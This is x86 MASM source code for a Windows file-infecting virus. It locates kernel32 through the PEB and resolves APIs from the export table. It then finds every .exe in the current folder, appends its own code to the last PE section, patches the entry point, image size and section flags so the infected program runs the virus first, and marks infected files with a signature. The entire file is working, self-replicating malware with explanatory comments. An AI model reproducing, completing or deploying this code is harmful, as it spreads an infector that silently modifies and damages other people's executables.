.386
.model flat, stdcall
option casemap:none

.code
main:
icode 	segment
start_index:

	call 	Delta
	Delta:
		pop 	ebp
		sub 	ebp, offset Delta


	call 	GetK32
	mov 	[ebp + ker32], eax

	call 	GetAPIs

	;-------------------------------------------
	;	Find address MessageBoxA
	;
	;	HMODULE LoadLibraryA(
	;	  LPCSTR lpLibFileName
	;	);
	;____________________________________________________________________________
	;	FARPROC GetProcAddress(
	;	  HMODULE hModule,
	;	  LPCSTR  lpProcName
	;	);
	;
	;	hModule: A handle to the DLL module that contains the function or variable. 
	;	lpProcName: The function or variable name, or the function's ordinal value. If this parameter is an ordinal value, it must be in the low-order word; the high-order word must be zero.
	;-------------------------------------------
	lea  	eax, [ebp + user32]
	push 	eax
	call 	[ebp + _LoadLibraryA]

	lea 	ebx, [ebp + MessageBoxA]
	push 	ebx
	push 	eax
	call 	[ebp + _GetProcAddress]
	mov 	[ebp + _MessageBoxA], eax


	;-------------------------------------------
	; Store OEP file 
	;-------------------------------------------
	mov 	eax, [ebp + oldOEP]
	mov 	[ebp + OEP], eax

	jmp 	FindFirstFile
	
	; jump to OEP
	Return:
		jmp 	dword ptr [ebp + OEP]

	;-------------------------------------------
	;	HANDLE FindFirstFileA(
	;	  LPCSTR             lpFileName,
	;	  LPWIN32_FIND_DATAA lpFindFileData
	;	);
	;
	;	If the function succeeds, the return value is a search handle used in a subsequent call to FindNextFile or FindClose, 
	;	and the lpFindFileData parameter contains information about the first file or directory found.
	;
	;	If the function fails or fails to locate files from the search string in the lpFileName parameter, 
	;	the return value is INVALID_HANDLE_VALUE and the contents of lpFindFileData are indeterminate. 
	;	To get extended error information, call the GetLastError function.
	;__________________________________________
	;
	;	BOOL FindNextFileA(
	;	  HANDLE             hFindFile,
	;	  LPWIN32_FIND_DATAA lpFindFileData
	;	);
	;
	;	If the function succeeds, the return value is nonzero and the lpFindFileData parameter contains information about the next file or directory found.
	;
	;	If the function fails, the return value is zero and the contents of lpFindFileData are indeterminate. 
	;	To get extended error information, call the GetLastError function.
	;
	;	If the function fails because no more matching files can be found, the GetLastError function returns ERROR_NO_MORE_FILES.
	;-------------------------------------------
	FindFirstFile:
		lea 	eax, [ebp + lpFindFileData]
		push 	eax
		lea 	eax, [ebp + lpFileName]
		push 	eax
		call 	[ebp + _FindFirstFileA]
		mov 	[ebp + hFindFile], eax

		cmp 	eax, -1
		jz 		Exit

		jmp 	Preparation

	FindNextFile:
		lea 	eax, [ebp + lpFindFileData]
		push 	eax
		push 	[ebp + hFindFile]
		call 	[ebp + _FindNextFileA]

		test 	eax, eax
		jz 		Exit

	Preparation:
	;-------------------------------------------
	;	HANDLE CreateFileA(
	;	  LPCSTR                lpFileName,
	;	  DWORD                 dwDesiredAccess,
	;	  DWORD                 dwShareMode,
	;	  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	;	  DWORD                 dwCreationDisposition,
	;	  DWORD                 dwFlagsAndAttributes,
	;	  HANDLE                hTemplateFile
	;	);
	; 
	;	If the function succeeds, the return value is an open handle to the specified file, device, named pipe, or mail slot.
	;
	;	If the function fails, the return value is INVALID_HANDLE_VALUE. To get extended error information, call GetLastError.
	;-------------------------------------------

	; Get file name in lpFindFileData
		lea 	ebx, [ebp + lpFindFileData + 2Ch] 	

	;-------------------------------------------
	; Show MessageBox
	;-------------------------------------------
		push 	0
		lea 	eax, [ebp + stitle]
		push 	eax
		push 	ebx
		push 	0
		call 	[ebp + _MessageBoxA]

		push 	0							; NULL
		push 	80h							; FILE_ATTRIBUTE_NORMAL
		push 	3h							; OPEN_EXISTING
		push 	0 							; NULL
		push 	00000001h					; FILE_SHARE_READ
		push 	0C0000000h					; GENERIC_READ | GENERIC_WRITE
		push 	ebx 						; Pointer file name
		call 	[ebp + _CreateFileA]

		cmp 	eax, -1
		jz 		FindNextFile

		mov 	[ebp + hFile], eax

	;-------------------------------------------
	; Get Info PE file 
	;
	;	DWORD SetFilePointer(
	;	  HANDLE hFile,
	;	  LONG   lDistanceToMove,
	;	  PLONG  lpDistanceToMoveHigh,
	;	  DWORD  dwMoveMethod
	;	);
	;
	;	If the function succeeds and lpDistanceToMoveHigh is NULL, the return value is the low-order DWORD of the new file pointer. 
	;	Note  If the function returns a value other than INVALID_SET_FILE_POINTER, the call to SetFilePointer has succeeded. 
	;	You do not need to call GetLastError.
	;
	;	If function succeeds and lpDistanceToMoveHigh is not NULL, the return value is the low-order DWORD of the new file pointer and 
	;	lpDistanceToMoveHigh contains the high order DWORD of the new file pointer.
	;
	;	If the function fails, the return value is INVALID_SET_FILE_POINTER. To get extended error information, call GetLastError.
	;
	;	If a new file pointer is a negative value, the function fails, the file pointer is not moved, and the code returned by GetLastError 
	;	is ERROR_NEGATIVE_SEEK.
	;
	;	If lpDistanceToMoveHigh is NULL and the new file position does not fit in a 32-bit value, the function fails and returns INVALID_SET_FILE_POINTER.
	;___________________________________________
	;	BOOL ReadFile(
	;	  HANDLE       hFile,
	;	  LPVOID       lpBuffer,
	;	  DWORD        nNumberOfBytesToRead,
	;	  LPDWORD      lpNumberOfBytesRead,
	;	  LPOVERLAPPED lpOverlapped
	;	);
	;-------------------------------------------



	; Set pointer point to e_lfanew
		push 	0 							; FILE_BEGIN
		push 	0							; NULL
		push 	3Ch							; e_lfanew
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

	; Get value offset PE header
		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + ntHeader]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

		mov 	eax, [ebp + ntHeader]

	;-------------------------------------------
	; Check PE32 
	;-------------------------------------------

	; Check 'ZM'
		push 	eax

		push 	0
		push 	0
		push 	0
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	2
		lea 	eax, [ebp + lpBuffer]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

		pop 	eax

		cmp 	word ptr [ebp + lpBuffer], 5A4Dh
		jnz 	CloseFile

	; Check '00EP'
		push 	eax

		push 	0
		push 	0
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + lpBuffer]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

		pop 	eax

		cmp 	[ebp + lpBuffer], 00004550h
		jnz 	CloseFile

	; Check Magic (010B)
		push 	eax
		add 	eax, 18h

		push 	0
		push 	0
		push 	eax
		push 	[ebp + hFile]	
		call 	[ebp + _SetFilePointer]

		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	2
		lea 	eax, [ebp + lpBuffer]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

		pop 	eax

		cmp 	word ptr [ebp + lpBuffer], 010BH
		jnz 	CloseFile

	; Get value NumberOfSections
	 	push 	eax
	 	add 	eax, 6h

	 	push 	0
	 	push 	0
	 	push 	eax
	 	push 	[ebp + hFile]
	 	call 	[ebp + _SetFilePointer]

	 	push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	2
		lea 	eax, [ebp + numOfSec]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	 	pop 	eax

	; Get value SizeOfOptionalHeader
		add 	eax, 14h
		push 	0
		push 	0
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	2
		lea 	eax, [ebp + szOfOptional]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	; Get value AddressOfEntrypoint
		push 	1
		push 	0
		push 	12h
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + oldOEP]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	; Get value ImageBase
		push 	1
		push 	0
		push 	08h
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + ImageBase]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	; Calc OEP VA
		mov 	eax, [ebp + oldOEP]
		add 	eax, [ebp + ImageBase]
		mov 	[ebp + oldOEP], eax

	; Get value SectionAlignment
		mov 	eax, [ebp + ntHeader]
		add 	eax, 38h
	 	push 	0
	 	push 	0
	 	push 	eax
	 	push 	[ebp + hFile]
	 	call 	[ebp + _SetFilePointer]

	 	push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + SecAlign]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	; Get value FileAlignment
		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + FileAlign]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	;-------------------------------------------
	; Get info of last Section
	;-------------------------------------------
		movzx 	eax, word ptr [ebp + numOfSec]
		dec 	eax
		mov 	ecx, 28h
		mul 	ecx
		mov 	ecx, [ebp + ntHeader]
		add 	ecx, 18h						; size of Signature and FileHeader
		add 	eax, ecx
		movzx 	ecx, word ptr [ebp + szOfOptional]
		add 	eax, ecx
		add 	eax, 8h 						; 8 bytes name of section
		mov 	[ebp + offsetSec], eax 			; store pointer to last section (offset Virtual Size)

		push 	0
		push 	0
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

	; Get value of VirtualSize
		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + virSize]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	; Get value of VirtualAddress
		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + virAdd]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	; Get value of RawSize
		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + rawSize]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	; Get value of RawAddress
		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + rawAdd]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

	;-------------------------------------------
	; File Infected? 
	;-------------------------------------------
		mov 	ebx, offset end_index
		sub 	ebx, offset kmv

		mov 	eax, [ebp + rawAdd]
		add 	eax, [ebp + virSize]
		sub 	eax, ebx

		push 	0
		push 	0
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0						
		lea 	eax, [ebp + lpNumByte]
		push 	eax
		push 	4
		lea 	eax, [ebp + lpBuffer]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _ReadFile]

		cmp 	[ebp + lpBuffer], 004b4d56h
		jz 		CloseFile

	Infect:
	;-------------------------------------------
	; Infect code into PE file
	;-------------------------------------------
		mov 	eax, [ebp + rawAdd]
		add 	eax, [ebp + virSize]
		mov 	[ebp + newOEP], eax

		push 	0
		push 	0
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

	;-------------------------------------------
	;	BOOL WriteFile(
	;	  HANDLE       hFile,
	;	  LPCVOID      lpBuffer,
	;	  DWORD        nNumberOfBytesToWrite,
	;	  LPDWORD      lpNumberOfBytesWritten,
	;	  LPOVERLAPPED lpOverlapped
	;	);
	;-------------------------------------------
	; Write code to file
		push 	0
		lea 	eax, [ebp + lpBuffer]		
		push 	eax
		push 	[ebp + szCode]
		lea 	eax, [ebp + start_index]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _WriteFile]

	;-------------------------------------------
	; Change PE Header
	;-------------------------------------------

	; Change AddressOfEntryPoint
		mov 	eax, [ebp + newOEP]
		sub 	eax, [ebp + rawAdd]
		add 	eax, [ebp + virAdd]
		mov 	[ebp + newOEP], eax

		mov 	eax, [ebp + ntHeader]
		add 	eax, 28h

		push 	0
		push 	0
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0
		lea 	eax, [ebp + lpBuffer]		
		push 	eax
		push 	4
		lea 	eax, [ebp + newOEP]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _WriteFile]

	; Change SizeOfImage
		mov 	ebx, [ebp + virSize]
		add 	ebx, [ebp + szCode]
		push 	ebx
		xor 	eax, eax
		test 	ebx, 00000FFFh
		jz 		Calc
		inc 	eax
	Calc:
		mov 	ecx, 1000h
		mul 	ecx
		shr 	ebx, 0Ch
		xchg 	eax, ebx
		mul 	ecx
		add 	eax, ebx
		add 	eax, [ebp + virAdd]
		mov 	[ebp + counter], eax

		push 	1
		push 	0
		push 	24h
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]


		push 	0
		lea 	eax, [ebp + lpBuffer]		
		push 	eax
		push 	4
		lea 	eax, [ebp + counter]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _WriteFile]

	; Change Virtual Size
		pop 	ebx
		mov 	[ebp + counter], ebx

		push 	0
		push 	0
		push 	[ebp + offsetSec]
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0
		lea 	eax, [ebp + lpBuffer]		
		push 	eax
		push 	4
		lea 	eax, [ebp + counter]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _WriteFile]

	; Change Raw Size

		push 	1
		push 	0
		push 	4
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		push 	0
		lea 	eax, [ebp + lpBuffer]		
		push 	eax
		push 	4
		lea 	eax, [ebp + counter]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _WriteFile]

	; Change Characteractics
		push 	1
		push 	0
		push 	10h
		push 	[ebp + hFile]
		call 	[ebp + _SetFilePointer]

		mov 	[ebp + counter], 0E0000060h

		push 	0
		lea 	eax, [ebp + lpBuffer]		
		push 	eax
		push 	4
		lea 	eax, [ebp + counter]
		push 	eax
		push 	[ebp + hFile]
		call 	[ebp + _WriteFile]

	CloseFile:
		push 	[ebp + hFile]
		call 	[ebp + _CloseHandle]

		jmp 	FindNextFile

;─────────────────────────────────────────────────────
; Subroutine
;_____________________________________________________

	;-------------------------------------------
	; Get ImageBase address Kernel32.dll
	;
	; OUTPUT EAX: Kernel32 address 
	;-------------------------------------------

	GetK32 			proc

		ASSUME FS:NOTHING
		mov 	eax, fs:[30h]						; EAX = PEB
		mov 	eax, [eax + 0Ch] 					; PEB->Ldr
		mov 	eax, [eax + 14h] 					; PEB->Ldr.InMemoryOrderModuleList.Flink
		mov 	eax, [eax] 							; next entry (2nd entry)
		mov 	eax, [eax] 							; next entry (3rd entry)
		mov 	eax, [eax + 10h] 					; 3rd entry base addr (kernel32.dll)

		ret
	GetK32 			endp

	;-------------------------------------------
	; Get address of function
	;
	; INPUT 	ESI: Pointer to API name
	; 
	; OUTPUT 	EAX: API address	
	;-------------------------------------------

	GetAPI 			proc

		mov 	edx, esi

	str_count:
		cmp 	byte ptr [esi], 0
		jz 		str_end
		inc 	esi
		jmp 	str_count

	str_end:
		inc 	esi
		sub 	esi, edx
		mov 	ecx, esi

		mov 	esi, [ebp + ENT]
		xor 	ebx, ebx

	get_ent_value:
		inc 	ebx
		push 	ecx
		push 	esi
		mov 	edi, edx
		lodsd
		add 	eax, [ebp + ker32]
		mov 	esi, eax
		repe 	cmpsb
		jz 		get_eot_value
		pop 	esi
		pop 	ecx
		add 	esi, 4
		jmp 	get_ent_value

	get_eot_value:
		pop 	esi
		pop		ecx

		shl 	ebx, 1
		mov 	esi, [ebp + EOT]
		add 	esi, ebx
		xor 	eax, eax
		lodsw

	get_eat_value:
		dec 	eax
		shl 	eax, 2
		mov 	esi, [ebp + EAT]
		add 	esi, eax
		lodsd
		add 	eax, [ebp + ker32]

		ret
	GetAPI 			endp

	;-------------------------------------------
	; Get all API necessary
	;-------------------------------------------

	GetAPIs 		proc

		; Read e_lfanew and conver to VA
		mov 	esi, [ebp + ker32]
		add 	esi, 3Ch
		xor 	eax, eax
		lodsw
		add 	eax, [ebp + ker32]

		mov 	esi, [eax + 78h] 			; Get Export Table RVA
		add 	esi, [ebp + ker32]			; Pointer to Address Table

		add 	esi, 1Ch
		lodsd
		add 	eax, [ebp + ker32]
		mov 	[ebp + EAT], eax

		lodsd
		add 	eax, [ebp + ker32]
		mov 	[ebp + ENT], eax

		lodsd
		add 	eax, [ebp + ker32]
		mov 	[ebp + EOT], eax

		lea 	eax, [ebp + K32FuncName]
		mov 	esi, eax
		lea 	eax, [ebp + K32FuncAdd]
		mov 	edi, eax

		mov 	ecx, 0Eh
		xor 	eax, eax
		mov 	[ebp + counter], eax

 	loop_apis:
		pushad
		call 	GetAPI
		mov 	ebx, [esp]
		mov 	[ebx], eax
		mov 	[ebp + counter], ecx
		popad
		add 	edi, 4
		add 	esi, [ebp + counter]
		loop 	loop_apis

		ret
	GetAPIs 		endp

	Exit 			proc
		push 	0
		lea 	eax, [ebp + stitle]
		push 	eax
		lea 	eax, [ebp + error]
		push 	eax
		push 	0
		call 	[ebp + _MessageBoxA]

		cmp 	ebp, 0
		jne 	Return

		push 	0
		call 	[ebp + _ExitProcess]
	Exit 			endp

	;-------------------------------------------
	; Data
	;-------------------------------------------

		kmv 				dd 		004b4d56h

		ker32 				dd 		?
		counter 			dd 		?

		szCode 				dd 		offset end_index - offset start_index
		oldOEP 				dd 		?
		newOEP 				dd 		?
		OEP 				dd 		?

		ntHeader 			dd 		?
		szOfOptional 		dw 		?
		numOfSec 			dw 		?

		EAT 				dd 		?
		ENT 				dd 		?
		EOT 				dd 		?

		ImageBase 			dd 		?
		FileAlign 			dd 		?
		SecAlign 			dd 		?
		virSize 			dd 		?
		virAdd 				dd 		?
		rawSize 			dd 		?
		rawAdd				dd   	?
		offsetSec 			dd 		?

		lpNumByte 			dd 		?
		lpBuffer 			dd 		?

		lpFileName 			db 		"*.exe", 0
		lpFindFileData 		db 		320 dup(?)
		hFindFile 			dd 		?
		hFile 				dd 		?

		user32 				db 		"user32.dll", 0
		MessageBoxA 		db 		"MessageBoxA", 0
		_MessageBoxA		dd 		?
		msg 				db 		"INFECTED", 0
		error 				db 		"Done!", 0
		stitle 				db 		"TITLE MSG", 0

		K32FuncAdd:
			_GetProcAddress         dd      ?
	        _LoadLibraryA           dd      ?
	        _ExitProcess            dd      ?
	        _CloseHandle            dd      ?
	        _CreateFileA            dd      ?
	        _FindClose              dd      ?
	        _FindFirstFileA         dd      ?
	        _FindNextFileA          dd      ?
	        _GetCurrentDirectoryA   dd      ?
	        _ReadFile               dd      ?
	        _SetFilePointer         dd      ?
	        _WriteFile              dd      ?
	        _lstrcatA               dd      ?
	        _VirtualProtect         dd      ?

	    K32FuncName:
	    	GetProcAddress         	db      "GetProcAddress", 0
	        LoadLibraryA            db      "LoadLibraryA", 0
	        ExitProcess            	db      "ExitProcess", 0
	        CloseHandle            	db      "CloseHandle", 0
	        CreateFileA            	db      "CreateFileA", 0
	        FindClose              	db      "FindClose", 0
	        FindFirstFileA         	db      "FindFirstFileA", 0
	        FindNextFileA          	db      "FindNextFileA", 0
	        GetCurrentDirectoryA   	db      "GetCurrentDirectoryA", 0
	        ReadFile               	db      "ReadFile", 0
	        SetFilePointer         	db      "SetFilePointer", 0
	        WriteFile              	db      "WriteFile", 0
	        lstrcatA               	db      "lstrcatA", 0
	        VirtualProtect         	db      "VirtualProtect", 0
end_index:	     
icode 	ends
end main